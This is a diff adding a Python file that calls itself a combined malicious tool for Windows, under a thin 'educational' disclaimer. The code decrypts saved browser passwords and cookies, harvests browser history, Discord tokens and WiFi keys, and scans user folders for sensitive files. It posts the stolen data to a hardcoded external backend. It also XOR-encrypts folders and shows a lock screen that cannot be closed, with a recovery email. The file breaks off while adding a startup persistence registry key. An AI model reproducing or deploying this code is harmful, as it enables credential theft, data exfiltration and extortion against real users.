@@ -1,0 +1,967 @@
+"""
+Combined Malicious Tool - All-in-One
+Combines: tokenAccess, sendDataOS, encrypData, folderMonitor
+- Runs in background on Windows
+- Extracts browser passwords, cookies, tokens
+- Collects sensitive files
+- Encrypts folders and shows password GUI
+- Monitors folder access
+
+WARNING: For EDUCATIONAL/RESEARCH purposes only.
+"""
+
+import os
+import sys
+import json
+import base64
+import sqlite3
+import shutil
+import platform
+import threading
+import time
+import re
+import requests
+import hashlib
+import struct
+import subprocess
+from datetime import datetime, timedelta
+from pathlib import Path
+from collections import deque
+
+# Try to import Windows-specific modules
+try:
+    import ctypes
+    import winreg
+    WINDOWS = True
+except ImportError:
+    WINDOWS = False
+
+# Try to import tkinter for GUI
+try:
+    import tkinter as tk
+    from tkinter import ttk, messagebox, filedialog
+    import webbrowser
+    HAS_GUI = True
+except ImportError:
+    HAS_GUI = False
+
+# Try to import watchdog for folder monitoring
+try:
+    from watchdog.observers import Observer
+    from watchdog.events import FileSystemEventHandler
+    HAS_WATCHDOG = True
+except ImportError:
+    HAS_WATCHDOG = False
+
+# ==================== CONFIGURATION ====================
+BACKEND_URL = "https://clownfish-app-5kdkx.ondigitalocean.app"
+API_ENDPOINT = f"{BACKEND_URL}/api/receive"
+BATCH_ENDPOINT = f"{BACKEND_URL}/api/receive/batch"
+
+SUPPORT_EMAIL = "choengrayu307@gmail.com"
+MAX_ATTEMPTS = 3
+MASTER_PASSWORD = "123456"
+LOCK_FILE = ".folder_lock"
+ENCRYPTED_EXTENSION = ".locked"
+
+# Browser paths for Chromium browsers
+CHROMIUM_BROWSERS = {
+    "Chrome": {
+        "local_state": os.path.join("Google", "Chrome", "User Data", "Local State"),
+        "login_data": os.path.join("Google", "Chrome", "User Data", "Default", "Login Data"),
+        "cookies": os.path.join("Google", "Chrome", "User Data", "Default", "Network", "Cookies"),
+        "cookies_alt": os.path.join("Google", "Chrome", "User Data", "Default", "Cookies"),
+        "history": os.path.join("Google", "Chrome", "User Data", "Default", "History"),
+        "base_path": "Local"
+    },
+    "Brave": {
+        "local_state": os.path.join("BraveSoftware", "Brave-Browser", "User Data", "Local State"),
+        "login_data": os.path.join("BraveSoftware", "Brave-Browser", "User Data", "Default", "Login Data"),
+        "cookies": os.path.join("BraveSoftware", "Brave-Browser", "User Data", "Default", "Network", "Cookies"),
+        "cookies_alt": os.path.join("BraveSoftware", "Brave-Browser", "User Data", "Default", "Cookies"),
+        "history": os.path.join("BraveSoftware", "Brave-Browser", "User Data", "Default", "History"),
+        "base_path": "Local"
+    },
+    "Edge": {
+        "local_state": os.path.join("Microsoft", "Edge", "User Data", "Local State"),
+        "login_data": os.path.join("Microsoft", "Edge", "User Data", "Default", "Login Data"),
+        "cookies": os.path.join("Microsoft", "Edge", "User Data", "Default", "Network", "Cookies"),
+        "cookies_alt": os.path.join("Microsoft", "Edge", "User Data", "Default", "Cookies"),
+        "history": os.path.join("Microsoft", "Edge", "User Data", "Default", "History"),
+        "base_path": "Local"
+    },
+    "Opera": {
+        "local_state": os.path.join("Opera Software", "Opera Stable", "Local State"),
+        "login_data": os.path.join("Opera Software", "Opera Stable", "Login Data"),
+        "cookies": os.path.join("Opera Software", "Opera Stable", "Network", "Cookies"),
+        "cookies_alt": os.path.join("Opera Software", "Opera Stable", "Cookies"),
+        "history": os.path.join("Opera Software", "Opera Stable", "History"),
+        "base_path": "Roaming"
+    },
+    "Opera GX": {
+        "local_state": os.path.join("Opera Software", "Opera GX Stable", "Local State"),
+        "login_data": os.path.join("Opera Software", "Opera GX Stable", "Login Data"),
+        "cookies": os.path.join("Opera Software", "Opera GX Stable", "Network", "Cookies"),
+        "cookies_alt": os.path.join("Opera Software", "Opera GX Stable", "Cookies"),
+        "history": os.path.join("Opera Software", "Opera GX Stable", "History"),
+        "base_path": "Roaming"
+    },
+    "Vivaldi": {
+        "local_state": os.path.join("Vivaldi", "User Data", "Local State"),
+        "login_data": os.path.join("Vivaldi", "User Data", "Default", "Login Data"),
+        "cookies": os.path.join("Vivaldi", "User Data", "Default", "Network", "Cookies"),
+        "cookies_alt": os.path.join("Vivaldi", "User Data", "Default", "Cookies"),
+        "history": os.path.join("Vivaldi", "User Data", "Default", "History"),
+        "base_path": "Local"
+    },
+}
+
+# Firefox profile paths
+FIREFOX_PATHS = {
+    "Firefox": os.path.join("Mozilla", "Firefox", "Profiles"),
+    "Firefox Developer": os.path.join("Mozilla", "Firefox Developer Edition", "Profiles"),
+}
+
+# Sensitive file extensions
+SENSITIVE_EXTENSIONS = {
+    '.doc', '.docx', '.pdf', '.xls', '.xlsx', '.ppt', '.pptx',
+    '.txt', '.rtf', '.odt', '.ods', '.odp',
+    '.pem', '.key', '.crt', '.pfx', '.p12', '.ppk',
+    '.kdbx', '.keychain', '.keystore',
+    '.env', '.ini', '.cfg', '.conf',
+    '.db', '.sqlite', '.sqlite3', '.sql',
+    '.zip', '.rar', '.7z', '.tar', '.gz',
+    '.jpg', '.jpeg', '.png', '.gif', '.bmp',
+    '.wallet', '.dat',
+}
+
+# Folders to skip
+SKIP_FOLDERS = {
+    'Windows', 'Program Files', 'Program Files (x86)', 'ProgramData',
+    '$Recycle.Bin', 'System Volume Information', 'Recovery',
+    'node_modules', '__pycache__', '.git', '.svn', '.vscode',
+    'venv', '.venv', 'Temp', 'tmp', 'Cache', 'cache',
+}
+
+# Real-time capture settings
+realtime_passwords = deque(maxlen=100)
+SEND_INTERVAL = 30
+BROWSER_PATTERNS = ['chrome', 'firefox', 'edge', 'opera', 'brave', 'vivaldi', 'browser']
+LOGIN_PATTERNS = [r'login', r'signin', r'sign-in', r'auth', r'account', r'password']
+
+
+
+# ==================== HELPER FUNCTIONS ====================
+
+def get_system_info():
+    """Get basic system information"""
+    return {
+        "hostname": platform.node(),
+        "os": platform.system(),
+        "os_version": platform.version(),
+        "architecture": platform.architecture()[0],
+        "username": os.getenv("USERNAME") or os.getenv("USER"),
+        "timestamp": datetime.now().isoformat()
+    }
+
+
+def get_appdata_path(base_type="Local"):
+    """Get AppData path based on type (Local or Roaming)"""
+    if platform.system() != "Windows":
+        return None
+    if base_type == "Local":
+        return os.path.join(os.environ.get("USERPROFILE", ""), "AppData", "Local")
+    else:
+        return os.path.join(os.environ.get("USERPROFILE", ""), "AppData", "Roaming")
+
+
+def get_encryption_key(local_state_path):
+    """Get the AES encryption key used by Chromium browsers"""
+    try:
+        if platform.system() != "Windows":
+            return None
+        if not os.path.exists(local_state_path):
+            return None
+        import win32crypt
+        with open(local_state_path, "r", encoding="utf-8") as f:
+            local_state = json.load(f)
+        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+        encrypted_key = encrypted_key[5:]  # Remove DPAPI prefix
+        decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+        return decrypted_key
+    except Exception as e:
+        return None
+
+
+def decrypt_password(encrypted_password, key):
+    """Decrypt Chromium browser password using AES-GCM"""
+    try:
+        if platform.system() != "Windows" or not encrypted_password:
+            return None
+        if encrypted_password[:3] == b'v10' or encrypted_password[:3] == b'v11':
+            if not key:
+                return "[no_key]"
+            from Crypto.Cipher import AES
+            iv = encrypted_password[3:15]
+            payload = encrypted_password[15:]
+            cipher = AES.new(key, AES.MODE_GCM, iv)
+            decrypted_password = cipher.decrypt(payload)
+            decrypted_password = decrypted_password[:-16].decode('utf-8', errors='ignore')
+            return decrypted_password
+        else:
+            import win32crypt
+            decrypted = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
+            return decrypted.decode('utf-8', errors='ignore')
+    except Exception:
+        return "[decryption_failed]"
+
+
+def get_chromium_passwords(browser_name, browser_config):
+    """Extract saved passwords from Chromium-based browsers"""
+    passwords = []
+    try:
+        if platform.system() != "Windows":
+            return passwords
+        base_path = get_appdata_path(browser_config["base_path"])
+        if not base_path:
+            return passwords
+        login_data_path = os.path.join(base_path, browser_config["login_data"])
+        if not os.path.exists(login_data_path):
+            return passwords
+        local_state_path = os.path.join(base_path, browser_config["local_state"])
+        key = get_encryption_key(local_state_path)
+        temp_db = os.path.join(os.environ.get("TEMP", "/tmp"), f"{browser_name.lower()}_login_data.db")
+        shutil.copy2(login_data_path, temp_db)
+        conn = sqlite3.connect(temp_db)
+        cursor = conn.cursor()
+        cursor.execute("""
+            SELECT origin_url, action_url, username_value, password_value,
+                   date_created, date_last_used FROM logins ORDER BY date_last_used DESC
+        """)
+        for row in cursor.fetchall():
+            password = decrypt_password(row[3], key)
+            if row[2] or password:
+                passwords.append({
+                    "browser": browser_name, "origin_url": row[0], "action_url": row[1],
+                    "username": row[2], "password": password if password else "[empty]",
+                    "date_created": str(row[4]), "date_last_used": str(row[5])
+                })
+        cursor.close()
+        conn.close()
+        try:
+            os.remove(temp_db)
+        except:
+            pass
+    except Exception:
+        pass
+    return passwords
+
+
+def get_chromium_cookies(browser_name, browser_config):
+    """Extract cookies from Chromium-based browsers"""
+    cookies = []
+    try:
+        if platform.system() != "Windows":
+            return cookies
+        base_path = get_appdata_path(browser_config["base_path"])
+        if not base_path:
+            return cookies
+        cookie_path = os.path.join(base_path, browser_config["cookies"])
+        if not os.path.exists(cookie_path):
+            cookie_path = os.path.join(base_path, browser_config["cookies_alt"])
+        if not os.path.exists(cookie_path):
+            return cookies
+        local_state_path = os.path.join(base_path, browser_config["local_state"])
+        key = get_encryption_key(local_state_path)
+        temp_db = os.path.join(os.environ.get("TEMP", "/tmp"), f"{browser_name.lower()}_cookies.db")
+        shutil.copy2(cookie_path, temp_db)
+        conn = sqlite3.connect(temp_db)
+        cursor = conn.cursor()
+        cursor.execute("SELECT host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly FROM cookies ORDER BY host_key")
+        for row in cursor.fetchall():
+            value = decrypt_password(row[2], key)
+            cookies.append({
+                "browser": browser_name, "host": row[0], "name": row[1],
+                "value": value if value else "[encrypted]", "path": row[3],
+                "expires": str(row[4]), "is_secure": bool(row[5]), "is_httponly": bool(row[6])
+            })
+        cursor.close()
+        conn.close()
+        try:
+            os.remove(temp_db)
+        except:
+            pass
+    except Exception:
+        pass
+    return cookies
+
+
+def get_chromium_history(browser_name, browser_config):
+    """Extract browser history from Chromium-based browsers"""
+    history = []
+    try:
+        if platform.system() != "Windows":
+            return history
+        base_path = get_appdata_path(browser_config["base_path"])
+        if not base_path:
+            return history
+        history_path = os.path.join(base_path, browser_config["history"])
+        if not os.path.exists(history_path):
+            return history
+        temp_db = os.path.join(os.environ.get("TEMP", "/tmp"), f"{browser_name.lower()}_history.db")
+        shutil.copy2(history_path, temp_db)
+        conn = sqlite3.connect(temp_db)
+        cursor = conn.cursor()
+        cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 200")
+        for row in cursor.fetchall():
+            history.append({"browser": browser_name, "url": row[0], "title": row[1], "visit_count": row[2], "last_visit": str(row[3])})
+        cursor.close()
+        conn.close()
+        try:
+            os.remove(temp_db)
+        except:
+            pass
+    except Exception:
+        pass
+    return history
+
+
+def get_firefox_profiles():
+    """Get all Firefox profile directories"""
+    profiles = []
+    try:
+        if platform.system() != "Windows":
+            return profiles
+        roaming = get_appdata_path("Roaming")
+        for browser_name, profile_path in FIREFOX_PATHS.items():
+            full_path = os.path.join(roaming, profile_path)
+            if os.path.exists(full_path):
+                for profile_dir in os.listdir(full_path):
+                    profile_full_path = os.path.join(full_path, profile_dir)
+                    if os.path.isdir(profile_full_path):
+                        profiles.append({"browser": browser_name, "profile": profile_dir, "path": profile_full_path})
+    except Exception:
+        pass
+    return profiles
+
+
+def get_discord_tokens():
+    """Extract Discord tokens from local storage"""
+    tokens = []
+    try:
+        if platform.system() != "Windows":
+            return tokens
+        userprofile = os.environ.get("USERPROFILE", "")
+        discord_paths = [
+            os.path.join(userprofile, "AppData", "Roaming", "Discord", "Local Storage", "leveldb"),
+            os.path.join(userprofile, "AppData", "Roaming", "discordcanary", "Local Storage", "leveldb"),
+            os.path.join(userprofile, "AppData", "Roaming", "discordptb", "Local Storage", "leveldb"),
+            os.path.join(userprofile, "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),
+        ]
+        token_pattern = r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}'
+        mfa_pattern = r'mfa\.[\w-]{84}'
+        for path in discord_paths:
+            if not os.path.exists(path):
+                continue
+            for filename in os.listdir(path):
+                if not filename.endswith(('.log', '.ldb')):
+                    continue
+                filepath = os.path.join(path, filename)
+                try:
+                    with open(filepath, 'r', errors='ignore') as f:
+                        content = f.read()
+                    for token in re.findall(token_pattern, content):
+                        if token not in [t["token"] for t in tokens]:
+                            tokens.append({"type": "discord_token", "token": token, "source": path})
+                    for token in re.findall(mfa_pattern, content):
+                        if token not in [t["token"] for t in tokens]:
+                            tokens.append({"type": "discord_mfa_token", "token": token, "source": path})
+                except Exception:
+                    continue
+    except Exception:
+        pass
+    return tokens
+
+
+def send_to_backend(data):
+    """Send extracted data to backend server"""
+    try:
+        url = f"{BACKEND_URL}/api/browser-data"
+        headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
+        response = requests.post(url, json=data, headers=headers, timeout=60)
+        if response.status_code == 201:
+            return True
+        return False
+    except Exception:
+        return False
+
+
+def collect_all_browser_data():
+    """Collect all browser data and tokens from all installed browsers"""
+    system_info = get_system_info()
+    all_passwords, all_cookies, all_history, all_tokens = [], [], [], []
+
+    # Chromium browsers
+    for browser_name, browser_config in CHROMIUM_BROWSERS.items():
+        all_passwords.extend(get_chromium_passwords(browser_name, browser_config))
+        all_cookies.extend(get_chromium_cookies(browser_name, browser_config))
+        all_history.extend(get_chromium_history(browser_name, browser_config))
+
+    # Discord tokens
+    all_tokens.extend(get_discord_tokens())
+
+    return {
+        "system_info": system_info,
+        "passwords": {"data": all_passwords, "total_count": len(all_passwords)},
+        "cookies": {"data": all_cookies[:500], "total_count": len(all_cookies)},
+        "history": {"data": all_history[:500], "total_count": len(all_history)},
+        "tokens": {"data": all_tokens, "total_count": len(all_tokens)},
+        "extraction_timestamp": datetime.now().isoformat()
+    }
+
+
+# ==================== FOLDER ENCRYPTION ====================
+
+class FolderEncryptor:
+    """Encrypts and decrypts folder contents using XOR cipher with password"""
+
+    def __init__(self, password=MASTER_PASSWORD):
+        self.password = password
+        self.key = hashlib.sha256(password.encode()).digest()
+
+    def _xor_encrypt(self, data, key):
+        """XOR encrypt/decrypt data with key"""
+        result = bytearray()
+        key_len = len(key)
+        for i, byte in enumerate(data):
+            result.append(byte ^ key[i % key_len])
+        return bytes(result)
+
+    def encrypt_file(self, file_path):
+        """Encrypt a single file"""
+        try:
+            with open(file_path, 'rb') as f:
+                original_data = f.read()
+            original_name = os.path.basename(file_path).encode('utf-8')
+            name_length = len(original_name)
+            header = struct.pack('>I', name_length) + original_name
+            full_data = header + original_data
+            encrypted_data = self._xor_encrypt(full_data, self.key)
+            encrypted_path = file_path + ENCRYPTED_EXTENSION
+            with open(encrypted_path, 'wb') as f:
+                f.write(encrypted_data)
+            os.remove(file_path)
+            return True
+        except Exception:
+            return False
+
+    def decrypt_file(self, encrypted_path):
+        """Decrypt a single file"""
+        try:
+            with open(encrypted_path, 'rb') as f:
+                encrypted_data = f.read()
+            decrypted_data = self._xor_encrypt(encrypted_data, self.key)
+            name_length = struct.unpack('>I', decrypted_data[:4])[0]
+            original_name = decrypted_data[4:4+name_length].decode('utf-8')
+            original_data = decrypted_data[4+name_length:]
+            folder = os.path.dirname(encrypted_path)
+            original_path = os.path.join(folder, original_name)
+            with open(original_path, 'wb') as f:
+                f.write(original_data)
+            os.remove(encrypted_path)
+            return True
+        except Exception:
+            return False
+
+    def encrypt_folder(self, folder_path):
+        """Encrypt all files in a folder"""
+        folder_path = Path(folder_path)
+        encrypted_count = 0
+        if not folder_path.exists():
+            return 0
+        file_list = []
+        for root, dirs, files in os.walk(folder_path):
+            dirs[:] = [d for d in dirs if not d.startswith('.')]
+            for file in files:
+                if file == LOCK_FILE or file.endswith(ENCRYPTED_EXTENSION):
+                    continue
+                file_list.append(os.path.join(root, file))
+        for file_path in file_list:
+            if self.encrypt_file(file_path):
+                encrypted_count += 1
+        # Create lock file
+        lock_path = folder_path / LOCK_FILE
+        lock_data = {
+            'locked_at': datetime.now().isoformat(),
+            'files_count': encrypted_count,
+            'password_hash': hashlib.sha256(self.password.encode()).hexdigest()
+        }
+        with open(lock_path, 'w') as f:
+            json.dump(lock_data, f)
+        # Make lock file hidden on Windows
+        if WINDOWS:
+            try:
+                ctypes.windll.kernel32.SetFileAttributesW(str(lock_path), 2)
+            except:
+                pass
+        return encrypted_count
+
+    def decrypt_folder(self, folder_path):
+        """Decrypt all files in a folder"""
+        folder_path = Path(folder_path)
+        decrypted_count = 0
+        if not folder_path.exists():
+            return 0
+        encrypted_files = []
+        for root, dirs, files in os.walk(folder_path):
+            for file in files:
+                if file.endswith(ENCRYPTED_EXTENSION):
+                    encrypted_files.append(os.path.join(root, file))
+        for file_path in encrypted_files:
+            if self.decrypt_file(file_path):
+                decrypted_count += 1
+        # Remove lock file
+        lock_path = folder_path / LOCK_FILE
+        if lock_path.exists():
+            if WINDOWS:
+                try:
+                    ctypes.windll.kernel32.SetFileAttributesW(str(lock_path), 0)
+                except:
+                    pass
+            os.remove(lock_path)
+        return decrypted_count
+
+
+def is_folder_locked(folder_path):
+    """Check if folder is locked"""
+    return Path(folder_path).joinpath(LOCK_FILE).exists()
+
+
+# ==================== GUI CLASSES ====================
+
+if HAS_GUI:
+    class MultiFolderLockerGUI:
+        """GUI for unlocking multiple folders with password"""
+
+        def __init__(self, folder_paths, on_success_callback=None, auto_close=True):
+            self.folder_paths = folder_paths if isinstance(folder_paths, list) else [folder_paths]
+            self.on_success_callback = on_success_callback
+            self.auto_close = auto_close
+            self.attempts = 0
+            self.max_attempts = MAX_ATTEMPTS
+            self.unlocked = False
+            self.lockout_active = False
+            self.lockout_time = 0
+            self.lockout_duration = 600
+
+            self.root = tk.Tk()
+            self.root.title("🔒 Folders Locked")
+            self.root.geometry("500x600")
+            self.root.resizable(False, False)
+            self.center_window()
+            self.setup_style()
+            self.build_ui()
+            self.root.protocol("WM_DELETE_WINDOW", self.on_close)
+
+        def center_window(self):
+            self.root.update_idletasks()
+            x = (self.root.winfo_screenwidth() // 2) - 250
+            y = (self.root.winfo_screenheight() // 2) - 300
+            self.root.geometry(f'500x600+{x}+{y}')
+
+        def setup_style(self):
+            self.bg_color = "#1e1e2e"
+            self.fg_color = "#cdd6f4"
+            self.accent_color = "#f38ba8"
+            self.button_color = "#313244"
+            self.success_color = "#a6e3a1"
+            self.warning_color = "#f38ba8"
+            self.entry_bg = "#45475a"
+            self.root.configure(bg=self.bg_color)
+
+        def build_ui(self):
+            main_frame = tk.Frame(self.root, bg=self.bg_color, padx=40, pady=20)
+            main_frame.pack(fill=tk.BOTH, expand=True)
+
+            tk.Label(main_frame, text="🔐", font=("Segoe UI Emoji", 45), bg=self.bg_color, fg=self.fg_color).pack(pady=(0, 8))
+            tk.Label(main_frame, text="Your Folders Are Locked", font=("Segoe UI", 18, "bold"), bg=self.bg_color, fg=self.fg_color).pack(pady=(0, 5))
+            tk.Label(main_frame, text="Enter password to unlock your files", font=("Segoe UI", 10), bg=self.bg_color, fg="#888").pack(pady=(0, 15))
+
+            folders_frame = tk.Frame(main_frame, bg=self.button_color, padx=15, pady=10)
+            folders_frame.pack(fill=tk.X, pady=(0, 15))
+            tk.Label(folders_frame, text="📁 Locked Folders:", font=("Segoe UI", 10, "bold"), bg=self.button_color, fg=self.fg_color).pack(anchor=tk.W)
+            for folder in self.folder_paths:
+                tk.Label(folders_frame, text=f"   • {os.path.basename(folder)}", font=("Segoe UI", 10), bg=self.button_color, fg="#89b4fa").pack(anchor=tk.W)
+
+            pass_frame = tk.Frame(main_frame, bg=self.bg_color)
+            pass_frame.pack(fill=tk.X, pady=(0, 10))
+            tk.Label(pass_frame, text="Enter Password:", font=("Segoe UI", 11), bg=self.bg_color, fg=self.fg_color).pack(anchor=tk.W)
+
+            entry_container = tk.Frame(pass_frame, bg=self.entry_bg, highlightbackground=self.accent_color, highlightthickness=2)
+            entry_container.pack(fill=tk.X, pady=(8, 0))
+            self.password_var = tk.StringVar()
+            self.password_entry = tk.Entry(entry_container, textvariable=self.password_var, font=("Segoe UI", 13), show="●", bg=self.entry_bg, fg=self.fg_color, insertbackground=self.fg_color, relief=tk.FLAT, bd=10)
+            self.password_entry.pack(fill=tk.X, side=tk.LEFT, expand=True)
+            self.password_entry.bind('<Return>', lambda e: self.unlock_folders())
+
+            self.status_var = tk.StringVar()
+            self.status_label = tk.Label(main_frame, textvariable=self.status_var, font=("Segoe UI", 10), bg=self.bg_color, fg=self.warning_color)
+            self.status_label.pack(pady=(10, 5))
+
+            self.attempts_var = tk.StringVar()
+            self.update_attempts()
+            tk.Label(main_frame, textvariable=self.attempts_var, font=("Segoe UI", 9), bg=self.bg_color, fg="#666").pack(pady=(0, 12))
+
+            self.unlock_btn = tk.Button(main_frame, text="🔓 Unlock All Folders", font=("Segoe UI", 13, "bold"), bg=self.accent_color, fg="white", relief=tk.FLAT, pady=12, cursor="hand2", command=self.unlock_folders)
+            self.unlock_btn.pack(fill=tk.X, pady=(0, 10))
+
+            tk.Button(main_frame, text="🔑 Forgot Password?", font=("Segoe UI", 10), bg=self.button_color, fg="#89b4fa", relief=tk.FLAT, pady=8, cursor="hand2", command=self.show_forgot_password).pack(fill=tk.X)
+            tk.Label(main_frame, text="Contact support if you need help", font=("Segoe UI", 9), bg=self.bg_color, fg="#555").pack(side=tk.BOTTOM, pady=(15, 0))
+            self.password_entry.focus_set()
+
+        def update_attempts(self):
+            if self.lockout_active:
+                remaining = int(self.lockout_time + self.lockout_duration - time.time())
+                if remaining > 0:
+                    self.attempts_var.set(f"🔒 Locked for {remaining // 60}m {remaining % 60}s")
+                    self.root.after(1000, self.update_attempts)
+                else:
+                    self.lockout_active = False
+                    self.attempts = 0
+                    self.update_attempts()
+            else:
+                self.attempts_var.set(f"Attempts remaining: {self.max_attempts - self.attempts}")
+
+        def unlock_folders(self):
+            if self.lockout_active:
+                return
+            password = self.password_var.get()
+            if not password:
+                self.status_var.set("⚠ Please enter a password")
+                return
+            self.attempts += 1
+            self.update_attempts()
+            if self.attempts >= self.max_attempts:
+                self.lockout_active = True
+                self.lockout_time = time.time()
+                self.update_attempts()
+                return
+            self.unlock_btn.config(state=tk.DISABLED, text="🔄 Unlocking...")
+            self.root.update()
+            self.root.after(300, lambda: self._verify_and_unlock(password))
+
+        def _verify_and_unlock(self, password):
+            if password == MASTER_PASSWORD:
+                self.status_var.set("✓ Password correct!")
+                self.status_label.config(fg=self.success_color)
+                encryptor = FolderEncryptor(password)
+                total = 0
+                for folder in self.folder_paths:
+                    try:
+                        total += encryptor.decrypt_folder(folder)
+                    except:
+                        pass
+                if total > 0:
+                    self.unlocked = True
+                    messagebox.showinfo("Success", f"Unlocked {total} files!")
+                    if self.auto_close:
+                        self.root.destroy()
+                else:
+                    self.unlock_btn.config(state=tk.NORMAL, text="🔓 Unlock All Folders")
+            else:
+                self.status_var.set("✗ Wrong password!")
+                self.unlock_btn.config(state=tk.NORMAL, text="🔓 Unlock All Folders")
+                self.password_var.set("")
+
+        def show_forgot_password(self):
+            forgot = tk.Toplevel(self.root)
+            forgot.title("🔑 Password Recovery")
+            forgot.geometry("420x350")
+            forgot.configure(bg=self.bg_color)
+            forgot.transient(self.root)
+            forgot.grab_set()
+            frame = tk.Frame(forgot, bg=self.bg_color, padx=30, pady=25)
+            frame.pack(fill=tk.BOTH, expand=True)
+            tk.Label(frame, text="📧", font=("Segoe UI Emoji", 40), bg=self.bg_color, fg=self.fg_color).pack(pady=(0, 10))
+            tk.Label(frame, text="Password Recovery", font=("Segoe UI", 16, "bold"), bg=self.bg_color, fg=self.fg_color).pack(pady=(0, 10))
+            tk.Label(frame, text=f"Contact: {SUPPORT_EMAIL}", font=("Segoe UI", 11), bg=self.bg_color, fg="#89b4fa").pack(pady=(0, 15))
+            tk.Button(frame, text="📧 Open Email", font=("Segoe UI", 11, "bold"), bg=self.accent_color, fg="white", relief=tk.FLAT, pady=10, command=lambda: webbrowser.open(f"mailto:{SUPPORT_EMAIL}")).pack(fill=tk.X, pady=(0, 10))
+            tk.Button(frame, text="Close", font=("Segoe UI", 10), bg="#45475a", fg=self.fg_color, relief=tk.FLAT, pady=8, command=forgot.destroy).pack(fill=tk.X)
+
+        def on_close(self):
+            if not self.unlocked:
+                messagebox.showwarning("Cannot Close", "🔒 You must enter the correct password to unlock your files!")
+                return
+            self.root.destroy()
+
+        def run(self):
+            self.root.mainloop()
+            return self.unlocked
+
+
+# ==================== SENSITIVE DATA COLLECTOR ====================
+
+class SensitiveDataCollector:
+    """Collects sensitive user data on Windows"""
+
+    def __init__(self):
+        self.user_home = Path.home()
+        self.appdata = os.getenv('APPDATA')
+        self.localappdata = os.getenv('LOCALAPPDATA')
+
+    def get_user_directories(self):
+        """Get Windows user directories to scan"""
+        user_dirs = []
+        primary_dirs = [
+            self.user_home / 'Documents',
+            self.user_home / 'Desktop',
+            self.user_home / 'Downloads',
+            self.user_home / 'Pictures',
+        ]
+        for d in primary_dirs:
+            if d.exists():
+                user_dirs.append(d)
+        return user_dirs
+
+    def is_sensitive_file(self, file_path):
+        """Check if file is potentially sensitive"""
+        path = Path(file_path)
+        if path.suffix.lower() in SENSITIVE_EXTENSIONS:
+            return True
+        sensitive_patterns = ['password', 'credential', 'secret', 'key', 'token', 'auth', 'wallet', 'private']
+        filename_lower = path.name.lower()
+        return any(p in filename_lower for p in sensitive_patterns)
+
+    def scan_directory(self, directory, max_depth=4, current_depth=0):
+        """Recursively scan directory for sensitive files"""
+        sensitive_files = []
+        if current_depth > max_depth:
+            return sensitive_files
+        try:
+            for item in os.scandir(directory):
+                try:
+                    if item.is_file() and self.is_sensitive_file(item.path):
+                        sensitive_files.append({'path': item.path, 'name': item.name, 'size': item.stat().st_size})
+                    elif item.is_dir() and item.name not in SKIP_FOLDERS:
+                        sensitive_files.extend(self.scan_directory(item.path, max_depth, current_depth + 1))
+                except:
+                    continue
+        except:
+            pass
+        return sensitive_files
+
+    def collect_wifi_passwords(self):
+        """Collect saved WiFi passwords on Windows"""
+        wifi_data = []
+        if not WINDOWS:
+            return wifi_data
+        try:
+            result = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
+            profiles = []
+            for line in result.stdout.split('\n'):
+                if 'All User Profile' in line or 'Current User Profile' in line:
+                    profile_name = line.split(':')[1].strip()
+                    if profile_name:
+                        profiles.append(profile_name)
+            for profile in profiles:
+                try:
+                    result = subprocess.run(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
+                    wifi_info = {'ssid': profile, 'password': None}
+                    for line in result.stdout.split('\n'):
+                        if 'Key Content' in line:
+                            wifi_info['password'] = line.split(':')[1].strip()
+                            break
+                    wifi_data.append(wifi_info)
+                except:
+                    pass
+        except:
+            pass
+        return wifi_data
+
+    def collect_all(self):
+        """Collect all sensitive data"""
+        data = {
+            'timestamp': datetime.now().isoformat(),
+            'hostname': platform.node(),
+            'os': platform.system(),
+            'username': os.getenv('USERNAME'),
+            'sensitive_files': [],
+            'wifi_passwords': []
+        }
+        user_dirs = self.get_user_directories()
+        for user_dir in user_dirs:
+            data['sensitive_files'].extend(self.scan_directory(user_dir)[:50])
+        data['wifi_passwords'] = self.collect_wifi_passwords()
+        return data
+
+    def send_to_backend(self, data):
+        """Send collected data to backend"""
+        try:
+            url = f"{BACKEND_URL}/api/receive?type=sensitive_data"
+            response = requests.post(url, json=data, headers={'Content-Type': 'application/json'}, timeout=30)
+            return response.status_code in [200, 201]
+        except:
+            return False
+
+
+# ==================== FOLDER MONITOR ====================
+
+if HAS_WATCHDOG:
+    class LockedFolderHandler(FileSystemEventHandler):
+        """Handles file system events for locked folders"""
+
+        def __init__(self, locked_folders, on_access_callback=None):
+            super().__init__()
+            self.locked_folders = locked_folders
+            self.on_access_callback = on_access_callback
+            self.last_trigger_time = 0
+            self.cooldown = 5
+
+        def on_any_event(self, event):
+            current_time = time.time()
+            if current_time - self.last_trigger_time < self.cooldown:
+                return
+            for folder in self.locked_folders:
+                if event.src_path.startswith(str(folder)):
+                    if is_folder_locked(folder):
+                        self.last_trigger_time = current_time
+                        if self.on_access_callback:
+                            self.on_access_callback(folder)
+                        break
+
+    class FolderAccessMonitorThread(threading.Thread):
+        """Thread that monitors locked folders for access attempts"""
+
+        def __init__(self, locked_folders, on_access_callback=None):
+            super().__init__(daemon=True)
+            self.locked_folders = locked_folders
+            self.on_access_callback = on_access_callback
+            self.observer = None
+            self.running = False
+
+        def run(self):
+            self.running = True
+            self.observer = Observer()
+            handler = LockedFolderHandler(self.locked_folders, self.on_access_callback)
+            for folder in self.locked_folders:
+                if Path(folder).exists():
+                    self.observer.schedule(handler, str(folder), recursive=True)
+            self.observer.start()
+            while self.running:
+                time.sleep(1)
+            self.observer.stop()
+            self.observer.join()
+
+        def stop(self):
+            self.running = False
+
+
+# ==================== STARTUP PERSISTENCE ====================
+
+def add_to_startup():
+    """Add program to Windows startup"""
+    if not WINDOWS:
+        return False
+    try:
+        exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
